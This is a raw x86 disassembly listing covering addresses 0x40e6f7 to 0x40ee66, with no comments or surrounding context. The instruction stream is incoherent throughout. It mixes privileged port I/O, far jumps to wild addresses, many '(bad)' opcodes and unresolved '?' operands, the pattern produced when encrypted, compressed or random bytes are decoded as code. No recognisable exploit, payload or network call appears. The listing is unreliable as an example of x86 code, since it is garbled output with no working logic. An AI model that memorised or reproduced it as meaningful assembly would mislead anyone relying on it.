  40e6f7:	adc    dh,BYTE PTR [edx]
  40e6f9:	arpl   WORD PTR [ebx],ax
  40e6fb:	mov    ch,0x3d
  40e6fd:	jns    0x40e6d5
  40e6ff:	and    esp,edi
  40e701:	add    al,0x24
  40e703:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e704:	rcr    cl,cl
  40e706:	push   esi
  40e707:	jg     0x40e6fe
  40e709:	jle    0x40e779
  40e70b:	mov    ds:0x1cce2f64,eax
  40e710:	fwait
  40e711:	icebp  
  40e712:	out    0xc2,eax
  40e714:	add    ecx,DWORD PTR [eax+ebx*8+0x37f906fb]
  40e71b:	cmp    bl,BYTE PTR [ecx+0x1a33c8b7]
  40e721:	push   eax
  40e722:	out    dx,eax
  40e723:	xchg   edi,eax
  40e724:	add    ch,BYTE PTR [ebp+0x11]
  40e727:	mov    bl,bl
  40e729:	aas    
  40e72a:	addr16 jne 0x40e73b
  40e72d:	cmp    al,0x32
  40e72f:	push   ebp
  40e730:	jne    0x40e74a
  40e732:	adc    dl,BYTE PTR es:[ecx]
  40e735:	sub    eax,0xfd46c404
  40e73a:	inc    edx
  40e73b:	push   cs
  40e73c:	rcr    bl,0x37
  40e73f:	rol    BYTE PTR [ebx+0x5],cl
  40e742:	pop    edx
  40e743:	loopne 0x40e6e9
  40e745:	push   esi
  40e746:	into   
  40e747:	sbb    eax,0x3ee7da08
  40e74c:	ds and edi,ebx
  40e74f:	and    al,dh
  40e751:	in     al,dx
  40e752:	xchg   esi,eax
  40e753:	xor    DWORD PTR [esi],0xb6212cd6
  40e759:	inc    ebx
  40e75a:	lahf   
  40e75b:	sub    al,0xb7
  40e75d:	dec    esi
  40e75e:	xchg   ecx,eax
  40e75f:	or     dl,dh
  40e761:	sbb    edx,DWORD PTR [ecx-0x66]
  40e764:	mov    ds:0x56173530,al
  40e769:	cld    
  40e76a:	jae    0x40e73f
  40e76c:	sti    
  40e76d:	add    BYTE PTR [esi-0x70],ch
  40e770:	dec    edx
  40e771:	push   esi
  40e772:	sbb    al,0xb8
  40e774:	jp     0x40e7dc
  40e776:	push   cs
  40e777:	adc    eax,0x66b9f5a8
  40e77c:	push   ecx
  40e77d:	or     bl,dh
  40e77f:	dec    ebx
  40e780:	sub    eax,0xcbdfc7fc
  40e785:	push   eax
  40e786:	in     al,dx
  40e787:	pop    ds
  40e788:	dec    ebp
  40e789:	or     eax,0xe6308217
  40e78e:	int3   
  40e78f:	sbb    dh,BYTE PTR [esi+esi*2]
  40e792:	shl    BYTE PTR [edi+0x6e],1
  40e795:	ja     0x40e735
  40e797:	dec    ebp
  40e798:	call   0xce99f3f6
  40e79d:	aad    0x7e
  40e79f:	mov    eax,0x901f7b80
  40e7a4:	adc    BYTE PTR [ebp-0x6a751e85],0xca
  40e7ab:	js     0x40e75c
  40e7ad:	or     DWORD PTR [edx],ebp
  40e7af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e7b0:	das    
  40e7b1:	cdq    
  40e7b2:	ss mov al,0x4
  40e7b5:	push   edi
  40e7b6:	aad    0x60
  40e7b8:	test   DWORD PTR gs:[ebx+0x29],0xb4392adb
  40e7c0:	es sub eax,0x9c71d060
  40e7c6:	int    0x14
  40e7c8:	mov    edx,0xd57daccb
  40e7cd:	mov    eax,ds:0x2d5f6de8
  40e7d2:	sti    
  40e7d3:	xor    eax,DWORD PTR [ebp+0xf]
  40e7d6:	lock popf 
  40e7d8:	inc    edi
  40e7d9:	sbb    dl,bl
  40e7db:	dec    ebp
  40e7dc:	inc    esi
  40e7dd:	jb     0x40e78c
  40e7df:	adc    eax,0xd828834
  40e7e4:	pop    edx
  40e7e5:	fwait
  40e7e6:	pop    esi
  40e7e7:	xchg   ecx,eax
  40e7e8:	sub    ebp,esp
  40e7ea:	xchg   dl,dh
  40e7ec:	add    esi,DWORD PTR [edi-0x1]
  40e7ef:	inc    ebp
  40e7f0:	retfw  0x6280
  40e7f4:	mov    ch,al
  40e7f6:	adc    BYTE PTR [ecx+0x6169dc99],al
  40e7fc:	fwait
  40e7fd:	or     DWORD PTR [edi+0x4b],0x43
  40e801:	or     BYTE PTR [ecx+ebx*4],0xe4
  40e805:	mov    esi,0xe2f8b76f
  40e80a:	cmp    DWORD PTR [eax-0x41527418],esp
  40e810:	dec    edx
  40e811:	pop    es
  40e812:	adc    al,BYTE PTR ds:0x19f3c4c6
  40e818:	jg     0x40e7fc
  40e81a:	jmp    0x533c450e
  40e81f:	lods   al,BYTE PTR ds:[esi]
  40e820:	(bad)
  40e825:	sbb    bl,0xa5
  40e828:	(bad)  
  40e829:	ja     0x40e837
  40e82b:	jns    0x40e8a6
  40e82d:	or     eax,0x5b7f1211
  40e832:	aam    0x75
  40e834:	xchg   edi,eax
  40e835:	sub    DWORD PTR [ecx-0x6c],edi
  40e838:	je     0x40e80c
  40e83a:	xchg   esi,eax
  40e83b:	dec    esp
  40e83c:	out    dx,al
  40e83d:	xchg   ebx,eax
  40e83e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e83f:	or     BYTE PTR [eax+ebx*1],ch
  40e842:	(bad)  
  40e843:	pop    eax
  40e844:	jge    0x40e8bf
  40e846:	sbb    eax,0xe4ae497b
  40e84b:	adc    al,0x4c
  40e84d:	arpl   WORD PTR [ecx],dx
  40e84f:	jnp    0x40e831
  40e851:	xor    edi,0x10
  40e854:	inc    ecx
  40e855:	xor    esi,DWORD PTR [eax+0x19]
  40e858:	enter  0x6a1f,0x25
  40e85c:	or     dl,BYTE PTR [ebx]
  40e85e:	ret    0x2293
  40e861:	int3   
  40e862:	push   0xffffff94
  40e864:	shl    DWORD PTR [ebp+0x4],1
  40e867:	leave  
  40e868:	mov    ds,WORD PTR [ebx+0x12]
  40e86b:	mov    edx,0x498642a4
  40e870:	mov    ch,0xdb
  40e872:	xchg   ebp,eax
  40e873:	dec    esp
  40e874:	(bad)  
  40e875:	xor    DWORD PTR [edi],0x54
  40e878:	push   ebx
  40e879:	data16 jno 0x40e899
  40e87c:	sub    ebp,DWORD PTR [esi-0x8e72709]
  40e882:	call   0xf52ccc8c
  40e887:	and    BYTE PTR [edx+0x4],dl
  40e88a:	les    esp,FWORD PTR [ebx+0x5e41e2d2]
  40e890:	aaa    
  40e891:	fiadd  WORD PTR [ebx-0x22]
  40e894:	mov    edx,0x824b8552
  40e899:	xchg   ebx,eax
  40e89a:	xchg   BYTE PTR [ebx],dh
  40e89c:	pop    es
  40e89d:	in     eax,0xc6
  40e89f:	jo     0x40e8c7
  40e8a1:	int    0x71
  40e8a3:	add    eax,0x40e7e233
  40e8a8:	repz icebp 
  40e8aa:	cmp    al,0x1c
  40e8ac:	je     0x40e863
  40e8ae:	xchg   esi,eax
  40e8af:	xchg   BYTE PTR [ebx-0x23a51003],bl
  40e8b5:	dec    ecx
  40e8b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e8b7:	sti    
  40e8b8:	jp     0x40e875
  40e8ba:	adc    eax,0xf88c1f2d
  40e8bf:	fdivp  st(4),st
  40e8c1:	or     eax,0x87a4beee
  40e8c6:	dec    esi
  40e8c7:	mov    esi,0x74ff7b2c
  40e8cc:	cmp    al,0x38
  40e8ce:	(bad)  
  40e8d0:	xor    esi,edi
  40e8d2:	xchg   ecx,eax
  40e8d3:	jl     0x40e856
  40e8d5:	mov    ds:0x1dd377cb,eax
  40e8da:	mov    ?,esi
  40e8dc:	dec    ebx
  40e8dd:	cld    
  40e8de:	fistp  WORD PTR [edx+0x7efa7236]
  40e8e4:	push   ds
  40e8e5:	mov    ebx,0x7f13c055
  40e8ea:	sbb    ebp,DWORD PTR [eax+0x7a]
  40e8ed:	xor    al,0x96
  40e8ef:	stc    
  40e8f0:	mov    ebx,0xe6b07fcc
  40e8f5:	cli    
  40e8f6:	or     eax,DWORD PTR [edi]
  40e8f8:	jno    0x40e8aa
  40e8fa:	test   al,0x9c
  40e8fc:	push   ecx
  40e8fd:	into   
  40e8fe:	xor    eax,esp
  40e900:	push   esp
  40e901:	lds    esi,FWORD PTR [edi]
  40e903:	mov    ecx,0xb96ab3d9
  40e908:	jae    0x40e977
  40e90a:	push   edx
  40e90b:	mov    cl,0x99
  40e90d:	lds    ecx,FWORD PTR [ecx]
  40e90f:	dec    ebx
  40e910:	mov    ds:0x3283f4d9,al
  40e915:	imul   edx,DWORD PTR [esi-0x7],0xffffff99
  40e919:	adc    eax,0xb4c64902
  40e91e:	fistp  DWORD PTR [ebx+0x65a0babe]
  40e924:	jno    0x40e8e1
  40e926:	add    al,0x18
  40e928:	mov    ebp,0xa8cb8d88
  40e92d:	push   edx
  40e92e:	rol    DWORD PTR [edx+0x7cabe516],cl
  40e934:	push   ecx
  40e935:	xor    ah,ah
  40e937:	fisubr WORD PTR ds:0xf8b5b59a
  40e93d:	inc    edx
  40e93e:	inc    ecx
  40e93f:	mov    ds:0xa1587103,eax
  40e944:	stos   BYTE PTR es:[edi],al
  40e945:	cmp    cl,BYTE PTR [ecx+0x78]
  40e948:	(bad)  
  40e949:	mov    ds:0xc916078c,eax
  40e94e:	hlt    
  40e94f:	sti    
  40e950:	fcomip st,st(7)
  40e952:	add    al,0x90
  40e954:	stc    
  40e955:	cdq    
  40e956:	int3   
  40e957:	call   0xd62b9d27
  40e95c:	addr16 jne 0x40e90f
  40e95f:	pop    ds
  40e960:	test   BYTE PTR [ebx],ch
  40e962:	sub    BYTE PTR [bx+di+0x5f21],0x51
  40e968:	addr16 ret 
  40e96a:	es jmp 0x40e91a
  40e96d:	jb     0x40e914
  40e96f:	cs jns 0x40e90d
  40e972:	in     al,0xd2
  40e974:	sar    DWORD PTR [ebp+0x28141d8d],1
  40e97a:	rcl    BYTE PTR [ebp*8-0x6b9ca06e],cl
  40e981:	sub    eax,DWORD PTR [ebp+ebp*8+0x47]
  40e985:	xlat   BYTE PTR ds:[ebx]
  40e986:	mov    ds:0x9bb73089,al
  40e98b:	pop    esi
  40e98c:	out    dx,eax
  40e98d:	and    bh,0x2f
  40e990:	adc    ch,BYTE PTR [ebp+0x232b2787]
  40e996:	dec    ebp
  40e997:	pop    ebp
  40e998:	jno    0x40e920
  40e99a:	sub    eax,0x507d1602
  40e99f:	sbb    bl,bh
  40e9a1:	fwait
  40e9a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e9a3:	mov    bl,0xce
  40e9a5:	xchg   edx,eax
  40e9a6:	fidiv  DWORD PTR [esi]
  40e9a8:	outs   dx,BYTE PTR ds:[esi]
  40e9a9:	test   BYTE PTR [ecx+edi*4],dl
  40e9ac:	daa    
  40e9ad:	pop    edi
  40e9ae:	ret    
  40e9af:	in     al,dx
  40e9b0:	(bad)  
  40e9b1:	out    0x1e,al
  40e9b3:	ja     0x40e9ec
  40e9b5:	push   0xffffffd1
  40e9b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9b8:	xor    esi,esp
  40e9ba:	mov    eax,0xcdc30e97
  40e9bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e9c0:	std    
  40e9c1:	mov    ebx,0x233f5405
  40e9c6:	sahf   
  40e9c7:	es mov ecx,0x342d1d8f
  40e9cd:	ret    
  40e9ce:	jge    0x40ea4e
  40e9d0:	and    al,0xa1
  40e9d2:	sbb    al,ah
  40e9d4:	sub    eax,0xf4fcd31e
  40e9d9:	cmp    ebx,DWORD PTR [edx+eax*2]
  40e9dc:	rol    DWORD PTR [edi],cl
  40e9de:	aad    0x5c
  40e9e0:	jl     0x40ea34
  40e9e2:	test   BYTE PTR [edx-0x5c],0x9d
  40e9e6:	adc    al,0x2
  40e9e8:	xor    esp,ecx
  40e9ea:	or     eax,0xc5002c17
  40e9ef:	pop    eax
  40e9f0:	es das 
  40e9f2:	jnp    0x40ea4b
  40e9f4:	add    BYTE PTR [eax],bh
  40e9f6:	pop    esp
  40e9f7:	pop    edi
  40e9f8:	add    ah,BYTE PTR [ecx+ebp*1]
  40e9fb:	retf   
  40e9fc:	sti    
  40e9fd:	jl     0x40ea7b
  40e9ff:	mov    bl,0x54
  40ea01:	dec    ecx
  40ea02:	sbb    DWORD PTR [ecx],eax
  40ea04:	and    ch,dh
  40ea06:	and    DWORD PTR [ebx],eax
  40ea08:	stc    
  40ea09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea0a:	jnp    0x40ea2a
  40ea0c:	pushf  
  40ea0d:	fisubr WORD PTR [eax]
  40ea0f:	repz sahf 
  40ea11:	mov    dl,0x62
  40ea13:	fist   WORD PTR [eax+0xf82b90d]
  40ea19:	jns    0x40ea49
  40ea1b:	jnp    0x40ea67
  40ea1d:	cmp    al,0xa9
  40ea1f:	xchg   edi,eax
  40ea20:	mov    dl,0xb8
  40ea22:	xchg   edx,eax
  40ea23:	push   cs
  40ea24:	lods   eax,DWORD PTR ds:[esi]
  40ea25:	mov    bh,0x20
  40ea27:	dec    edi
  40ea28:	xor    BYTE PTR [eax],0x2d
  40ea2b:	sub    DWORD PTR [esi],ebp
  40ea2d:	xlat   BYTE PTR ds:[ebx]
  40ea2e:	stos   BYTE PTR es:[edi],al
  40ea2f:	les    eax,FWORD PTR [edi-0x6d21f12f]
  40ea35:	jl     0x40ea91
  40ea37:	leave  
  40ea38:	mov    cl,0x2e
  40ea3a:	inc    edx
  40ea3b:	repz push ecx
  40ea3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea3e:	dec    BYTE PTR [eax+0x5a0f552e]
  40ea44:	test   eax,0x1304dc20
  40ea49:	jge    0x40ea05
  40ea4b:	shr    DWORD PTR [eax+ebx*4-0x5640ecd8],1
  40ea52:	in     eax,dx
  40ea53:	dec    esp
  40ea54:	(bad)  ds:0x483f45ee
  40ea5a:	mov    ebp,0x750bc7da
  40ea5f:	inc    ecx
  40ea60:	lods   eax,DWORD PTR ds:[esi]
  40ea61:	push   edx
  40ea62:	fist   WORD PTR [ecx+ebp*8+0x58]
  40ea66:	adc    al,0x13
  40ea68:	xor    esi,edx
  40ea6a:	sub    al,0x33
  40ea6c:	mov    eax,0x84b83e19
  40ea71:	cdq    
  40ea72:	arpl   WORD PTR [esi-0x32],di
  40ea75:	jmp    0x40eab6
  40ea77:	add    ebp,DWORD PTR [ecx+0x2c98375a]
  40ea7d:	inc    eax
  40ea7e:	push   es
  40ea7f:	sub    bh,BYTE PTR [edx+ebp*8+0x59]
  40ea83:	xchg   ecx,eax
  40ea84:	aam    0x0
  40ea86:	mov    BYTE PTR [ebp+eax*4-0x79c045e3],ch
  40ea8d:	push   esp
  40ea8e:	imul   esp,esp,0x7c
  40ea91:	jb     0x40ea39
  40ea93:	sub    eax,0x9055a58e
  40ea98:	iret   
  40ea99:	aad    0xdf
  40ea9b:	hlt    
  40ea9c:	or     BYTE PTR [eax+0x390c0166],0x7
  40eaa3:	fisubr WORD PTR [ebx+0x6dc42c5a]
  40eaa9:	and    esp,esp
  40eaab:	fild   WORD PTR [eax]
  40eaad:	popf   
  40eaae:	cmc    
  40eaaf:	repz mov WORD PTR [edi+edi*4],?
  40eab3:	jns    0x40eaa5
  40eab5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eab6:	nop
  40eab7:	xor    dh,BYTE PTR ss:[edx+edi*1+0xf1ecd34]
  40eabf:	ror    BYTE PTR ds:0x4a7ab213,1
  40eac5:	sbb    bl,al
  40eac7:	add    ecx,DWORD PTR [edx]
  40eac9:	dec    si
  40eacb:	fs enter 0x2a79,0x42
  40ead0:	clc    
  40ead1:	clc    
  40ead2:	test   al,0x9d
  40ead4:	xor    ah,0x99
  40ead7:	lods   eax,DWORD PTR ds:[esi]
  40ead8:	adc    eax,edi
  40eada:	scas   al,BYTE PTR es:[edi]
  40eadb:	call   FWORD PTR [ebx]
  40eadd:	dec    edx
  40eade:	test   eax,0x7e150c25
  40eae3:	mov    eax,ds:0x4722ade0
  40eae8:	xchg   esp,eax
  40eae9:	and    dl,BYTE PTR [edx+0x5727b6e7]
  40eaef:	xor    BYTE PTR [edi-0x2f32a475],bh
  40eaf5:	in     al,0x6f
  40eaf7:	lahf   
  40eaf8:	daa    
  40eaf9:	xchg   ebx,eax
  40eafa:	xchg   edi,eax
  40eafb:	mov    DWORD PTR [eax+0x3bfaef70],esi
  40eb01:	mov    ch,0x1d
  40eb03:	sbb    al,0x71
  40eb05:	add    ch,bh
  40eb07:	js     0x40ea91
  40eb09:	fs ds pushf 
  40eb0c:	sbb    ch,BYTE PTR [edx-0x68efb911]
  40eb12:	bound  eax,QWORD PTR [eax-0x48]
  40eb15:	mov    esi,0x9a2837af
  40eb1a:	lea    edi,[ebp+ebp*1+0x52]
  40eb1e:	aam    0x41
  40eb20:	mov    DWORD PTR [esi],esp
  40eb22:	xchg   ecx,eax
  40eb23:	jo     0x40eaeb
  40eb25:	sar    DWORD PTR [eax+0x1031e62b],1
  40eb2b:	std    
  40eb2c:	push   esp
  40eb2d:	and    BYTE PTR [ebx-0x5ddd5dfd],dh
  40eb33:	pop    ebp
  40eb34:	scas   al,BYTE PTR es:[edi]
  40eb35:	jp     0x40eb0c
  40eb37:	test   DWORD PTR [ebx-0x5fb3a02b],ebp
  40eb3d:	jmp    0x57329695
  40eb42:	cmp    al,0xbb
  40eb44:	xor    cl,BYTE PTR [esp+edi*4-0x26]
  40eb48:	sub    ch,BYTE PTR [edx+0x1ee6fa6]
  40eb4e:	mov    edx,ebp
  40eb50:	hlt    
  40eb51:	push   cs
  40eb52:	push   esi
  40eb53:	pop    ecx
  40eb54:	mov    esp,0xa0941b2c
  40eb59:	scas   eax,DWORD PTR es:[edi]
  40eb5a:	push   es
  40eb5b:	push   ds
  40eb5c:	arpl   ax,cx
  40eb5e:	ds xchg ebp,eax
  40eb60:	add    eax,0x4d88d598
  40eb65:	mov    bh,BYTE PTR [esi]
  40eb67:	aam    0x96
  40eb69:	and    DWORD PTR [ebp-0x30],ebp
  40eb6c:	sub    DWORD PTR [ecx+0x2],0xffffffe0
  40eb70:	xor    al,0xec
  40eb72:	daa    
  40eb73:	mov    bl,al
  40eb75:	(bad)  
  40eb76:	je     0x40eb8a
  40eb78:	aad    0x4e
  40eb7a:	sbb    ah,dh
  40eb7c:	retf   
  40eb7d:	scas   eax,DWORD PTR es:[edi]
  40eb7e:	test   DWORD PTR [edx-0x2a],0xd6c13364
  40eb85:	push   cs
  40eb86:	repz popf 
  40eb88:	out    0x7a,al
  40eb8a:	ds sub esp,ebp
  40eb8d:	xchg   esp,eax
  40eb8e:	gs in  al,0xb3
  40eb91:	pop    esp
  40eb92:	adc    BYTE PTR [ecx+ecx*4],0x1f
  40eb96:	cmp    eax,0x368277e3
  40eb9b:	push   esp
  40eb9c:	and    DWORD PTR [ebp-0x647709fe],ebp
  40eba2:	adc    dl,BYTE PTR [edi+0x6c16d8c3]
  40eba8:	add    BYTE PTR [eax],dh
  40ebaa:	jmp    0x6cab9ed3
  40ebaf:	and    al,0xb8
  40ebb1:	shl    BYTE PTR [esi-0x14],0xa7
  40ebb5:	xor    al,BYTE PTR [ebx+0x75fd0b4d]
  40ebbb:	cmp    al,0x71
  40ebbd:	xor    al,0x71
  40ebbf:	ret    0x49c0
  40ebc2:	leave  
  40ebc3:	dec    esp
  40ebc4:	(bad)  
  40ebc5:	pop    ds
  40ebc6:	push   ss
  40ebc7:	aam    0x77
  40ebc9:	jle    0x40ebe0
  40ebcb:	outs   dx,DWORD PTR ds:[esi]
  40ebcc:	outs   dx,BYTE PTR ds:[esi]
  40ebcd:	inc    ebx
  40ebce:	in     al,dx
  40ebcf:	jne    0x40eb8a
  40ebd1:	stc    
  40ebd2:	(bad)  
  40ebd3:	xor    eax,0xe1f4f2a3
  40ebd8:	fs out dx,al
  40ebda:	mov    BYTE PTR [esi],al
  40ebdc:	mov    BYTE PTR [ecx-0x60],ch
  40ebdf:	sahf   
  40ebe0:	ss ret 0xeac3
  40ebe4:	xor    eax,0x8cab69d4
  40ebe9:	pop    eax
  40ebea:	xor    al,0x16
  40ebec:	loop   0x40ec4f
  40ebee:	cmp    eax,0x576b1b7
  40ebf3:	imul   ebx,DWORD PTR [ebx-0x254e511b],0x2d23f42c
  40ebfd:	fadd   st,st(0)
  40ebff:	lds    edx,FWORD PTR [ebp+ebx*1+0x73]
  40ec03:	ds fadd st(0),st
  40ec06:	or     eax,0x43d6e284
  40ec0b:	or     DWORD PTR [edi-0x76],ebp
  40ec0e:	xor    ebx,edx
  40ec10:	loop   0x40ec90
  40ec12:	sub    ch,dh
  40ec14:	or     BYTE PTR [ecx+0xd],bh
  40ec17:	imul   ecx,esi,0x85bcdef3
  40ec1d:	adc    dh,BYTE PTR [esi-0x3708437b]
  40ec23:	dec    ebp
  40ec24:	pop    ebp
  40ec25:	push   0x12
  40ec27:	xchg   edi,eax
  40ec28:	mov    eax,0x6870c18
  40ec2d:	sbb    ch,BYTE PTR [ecx+0x79c3c417]
  40ec33:	in     eax,dx
  40ec34:	adc    DWORD PTR [ebx-0x4f],0x77
  40ec38:	mov    BYTE PTR [edi+0x3597b323],dh
  40ec3e:	xor    dl,BYTE PTR [esi-0x754af92d]
  40ec44:	jmp    0x91fc:0xd76d
  40ec4a:	jl     0x40ebda
  40ec4c:	lea    esi,[edi-0x4944d87a]
  40ec52:	inc    eax
  40ec53:	xor    BYTE PTR [edi+0x305b5911],bl
  40ec59:	loope  0x40ecc4
  40ec5b:	cwde   
  40ec5c:	scas   al,BYTE PTR es:[edi]
  40ec5d:	iret   
  40ec5e:	das    
  40ec5f:	neg    BYTE PTR [edx-0x3a]
  40ec62:	and    edx,ebp
  40ec64:	jge    0x40ec97
  40ec66:	cmp    bl,bl
  40ec68:	fnstenv [edi-0x39cb61a]
  40ec6e:	push   esi
  40ec6f:	hlt    
  40ec70:	mov    WORD PTR [ebp+0x6e653ae8],?
  40ec76:	jns    0x40ecf2
  40ec78:	xor    DWORD PTR [edx-0xbe594a3],ebx
  40ec7e:	dec    edi
  40ec7f:	jg     0x40ecff
  40ec81:	mov    ecx,0x2b8a3cc5
  40ec86:	adc    bh,ah
  40ec88:	push   edi
  40ec89:	test   BYTE PTR [edi-0x12],ah
  40ec8c:	mov    DWORD PTR [ecx+0xdb39ab3],esi
  40ec92:	rcl    DWORD PTR [edi-0x54bd31f1],1
  40ec98:	pop    esi
  40ec99:	mov    edx,0x7a709d27
  40ec9e:	xor    al,dl
  40eca0:	fs sub cl,bl
  40eca3:	inc    edi
  40eca4:	mov    ds:0x34f87f32,eax
  40eca9:	sbb    eax,0xda4c0b59
  40ecae:	mov    dl,ah
  40ecb0:	mov    edi,0x4d1fbff2
  40ecb5:	mov    WORD PTR ds:0x2b653871,?
  40ecbb:	(bad)  
  40ecbd:	cli    
  40ecbe:	retf   0xb5e7
  40ecc1:	mov    bl,0x5a
  40ecc3:	cli    
  40ecc4:	stc    
  40ecc5:	cmp    DWORD PTR [ecx+0x2b76119d],esp
  40eccb:	add    al,0x69
  40eccd:	or     al,0xd0
  40eccf:	test   DWORD PTR [esi+0x293f15ed],ebx
  40ecd5:	fcmovbe st,st(7)
  40ecd7:	dec    eax
  40ecd8:	int3   
  40ecd9:	sahf   
  40ecda:	xor    bl,ah
  40ecdc:	out    dx,eax
  40ecdd:	fdivr  st,st(3)
  40ecdf:	push   ecx
  40ece0:	data16 (bad) ds:0x89e1d080
  40ece7:	call   0xd41fb4f6
  40ecec:	(bad)  
  40eced:	cmp    ebx,0x13769cbf
  40ecf3:	push   ds
  40ecf4:	pusha  
  40ecf5:	dec    eax
  40ecf6:	cmp    BYTE PTR [edi],dl
  40ecf8:	sbb    esp,DWORD PTR [eax]
  40ecfa:	loop   0x40ed14
  40ecfc:	arpl   WORD PTR [eax+0x2e],si
  40ecff:	dec    esp
  40ed00:	push   ecx
  40ed01:	out    dx,al
  40ed02:	leave  
  40ed03:	adc    eax,0x1a433bc3
  40ed08:	mov    edx,0x5cb980b5
  40ed0d:	xchg   edx,eax
  40ed0e:	ins    BYTE PTR es:[edi],dx
  40ed0f:	push   esi
  40ed10:	xchg   ebp,eax
  40ed11:	ins    BYTE PTR es:[edi],dx
  40ed12:	pop    ds
  40ed13:	xchg   esi,eax
  40ed14:	scas   al,BYTE PTR es:[edi]
  40ed15:	enter  0xafb3,0xe5
  40ed19:	mov    ecx,DWORD PTR [ebp-0x7f965268]
  40ed1f:	push   eax
  40ed20:	xlat   BYTE PTR ds:[ebx]
  40ed21:	adc    edx,edx
  40ed23:	test   eax,0x3ad06fa8
  40ed28:	or     dl,0xa4
  40ed2b:	push   edi
  40ed2c:	pop    ebp
  40ed2d:	or     eax,0xcc573fdb
  40ed32:	jns    0x40ed6e
  40ed34:	inc    eax
  40ed35:	hlt    
  40ed36:	scas   eax,DWORD PTR es:[edi]
  40ed37:	popa   
  40ed38:	mov    al,ds:0xab1aec42
  40ed3d:	xlat   BYTE PTR ds:[ebx]
  40ed3e:	cmp    ah,BYTE PTR [edi+0x4272c18e]
  40ed44:	jo     0x40edb2
  40ed46:	ret    
  40ed47:	call   0xe231:0x28dc5aa9
  40ed4e:	jmp    0x882b8d59
  40ed53:	retf   
  40ed54:	outs   dx,BYTE PTR ds:[esi]
  40ed55:	or     al,0x4a
  40ed57:	fcmovnb st,st(3)
  40ed59:	imul   BYTE PTR [edi+edx*2-0x4e]
  40ed5d:	aaa    
  40ed5e:	push   esi
  40ed5f:	jns    0x40ed5e
  40ed61:	pop    esp
  40ed62:	xchg   esp,eax
  40ed63:	pop    ss
  40ed64:	jns    0x40ecfe
  40ed66:	push   esi
  40ed67:	mov    bh,0x9a
  40ed69:	dec    edi
  40ed6a:	sub    al,0xb2
  40ed6c:	clc    
  40ed6d:	enter  0xd9f7,0x2
  40ed71:	push   ebx
  40ed72:	cmc    
  40ed73:	out    0xdf,eax
  40ed75:	inc    ebx
  40ed76:	sbb    esp,DWORD PTR [eax+0x74]
  40ed79:	add    ah,bl
  40ed7b:	sub    eax,0x4553baac
  40ed80:	stos   DWORD PTR es:[edi],eax
  40ed81:	lods   eax,DWORD PTR ds:[esi]
  40ed82:	adc    ebp,DWORD PTR [esi]
  40ed84:	mov    ebx,0xb0bdc061
  40ed89:	rcr    cl,1
  40ed8b:	sub    eax,esp
  40ed8d:	enter  0xc38d,0x65
  40ed91:	fcomp  DWORD PTR [edx+0x16]
  40ed94:	retf   
  40ed95:	sbb    al,0xef
  40ed97:	mov    WORD PTR [edx],es
  40ed99:	bound  esp,QWORD PTR [esi+edx*8-0x6c]
  40ed9d:	popa   
  40ed9e:	jl     0x40edde
  40eda0:	leave  
  40eda1:	or     BYTE PTR [ecx+0xe],dl
  40eda4:	push   ds
  40eda5:	test   al,0x48
  40eda7:	mov    ecx,0x84049f7e
  40edac:	sbb    edi,edi
  40edae:	mov    al,ds:0x47340d13
  40edb3:	(bad)  
  40edb5:	rcl    DWORD PTR [eax+0x3],0x8a
  40edb9:	mov    ds:0xab206f44,eax
  40edbe:	nop
  40edbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40edc0:	pop    ebx
  40edc1:	aad    0x8d
  40edc3:	jmp    0x40edf7
  40edc5:	dec    edi
  40edc6:	retf   0x3e5a
  40edc9:	mul    DWORD PTR [esi]
  40edcb:	push   edi
  40edcc:	mov    eax,0xfc71825b
  40edd1:	adc    BYTE PTR [ecx],cl
  40edd3:	push   esp
  40edd4:	shl    BYTE PTR [ecx+0x74f6c5e6],cl
  40edda:	std    
  40eddb:	bound  ecx,QWORD PTR [ecx+0x28]
  40edde:	in     eax,dx
  40eddf:	cwde   
  40ede0:	push   cs
  40ede1:	rcr    edi,1
  40ede3:	sbb    al,0x31
  40ede5:	lods   al,BYTE PTR ds:[esi]
  40ede6:	adc    DWORD PTR [ecx+edi*2-0x35],ebx
  40edea:	push   ebx
  40edeb:	mov    BYTE PTR [esp+ecx*4],0xd0
  40edef:	das    
  40edf0:	jmp    0x40ee27
  40edf2:	(bad)  
  40edf4:	jecxz  0x40ee6c
  40edf6:	or     DWORD PTR [esi],esp
  40edf8:	or     dh,cl
  40edfa:	call   0xe5ead145
  40edff:	jns    0x40ee28
  40ee01:	xchg   edx,eax
  40ee02:	mov    WORD PTR [ebp-0x52],es
  40ee05:	adc    al,0x17
  40ee07:	lods   eax,DWORD PTR ds:[esi]
  40ee08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee09:	add    esi,eax
  40ee0b:	test   BYTE PTR [edi+0x5a073df8],bl
  40ee11:	fwait
  40ee12:	push   edx
  40ee13:	adc    DWORD PTR [ebx+edi*4-0x9],ecx
  40ee17:	aaa    
  40ee18:	mov    eax,0x6bbaf984
  40ee1d:	(bad)  
  40ee1e:	sti    
  40ee1f:	pop    edi
  40ee20:	xchg   esp,eax
  40ee21:	inc    esi
  40ee22:	mov    dl,ah
  40ee24:	mov    cl,0x96
  40ee26:	call   0xeffb:0xfc474ced
  40ee2d:	in     al,0x45
  40ee2f:	out    0x61,eax
  40ee31:	ja     0x40ee8e
  40ee33:	mov    bl,0x6d
  40ee35:	add    bh,bl
  40ee37:	loop   0x40ee4c
  40ee39:	test   DWORD PTR [edi-0x44e33311],eax
  40ee3f:	(bad)
  40ee42:	call   0xc3e086f3
  40ee47:	fs cmp al,0x21
  40ee4a:	pop    ebp
  40ee4b:	adc    DWORD PTR [ecx],0xc6f1c32c
  40ee51:	xchg   edi,eax
  40ee52:	mov    ecx,0x32c0d4a3
  40ee57:	ret    
  40ee58:	out    0x44,al
  40ee5a:	aas    
  40ee5b:	fwait
  40ee5c:	fs mov bl,0xd1
  40ee5f:	or     ebx,0x15
  40ee62:	lea    ecx,[eax]
  40ee64:	mov    BYTE PTR [edi],bl
  40ee66:	push   ss
